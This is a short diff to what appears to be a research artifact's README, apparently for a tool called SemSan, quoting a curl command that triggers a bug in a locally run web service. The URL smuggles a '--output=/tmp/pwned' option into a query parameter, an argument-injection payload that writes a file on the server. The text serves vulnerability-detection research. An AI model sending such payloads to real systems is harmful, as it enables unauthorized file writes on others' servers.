@@ -72,7 +72,7 @@ web as well as SemSan with the [corresponding config](/nix/packages/by-name/arti
 Request the following URL with cURL or a web browser to trigger the bug:
 
 ```bash
-curl http://127.0.0.1:1234/?p=.git;a=blobdiff;f=*;hpb=--output=/tmp/pwned;hb=HEAD
+curl 'http://127.0.0.1:1234/?p=.git;a=blobdiff;f=*;hpb=--output=/tmp/pwned;hb=HEAD'
 ```
 
 ## RQ2: Detection Accuracy (Sec 7.2)
